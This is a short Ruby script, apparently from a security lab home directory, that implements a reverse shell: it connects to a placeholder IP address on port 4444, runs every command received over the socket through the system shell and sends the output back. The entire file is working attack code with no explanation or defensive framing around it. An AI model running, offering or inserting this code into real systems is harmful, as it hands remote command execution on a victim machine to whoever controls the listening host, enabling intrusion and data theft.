# /home/carlos/shell.rb
require 'socket'

# Replace with your own IP address and port
ip = 'your_ip_address'
port = 4444

begin
  socket = TCPSocket.open(ip, port)
  while command = socket.gets
    result = `#{command}`
    socket.puts result
  end
  socket.close
rescue
  socket.close
end
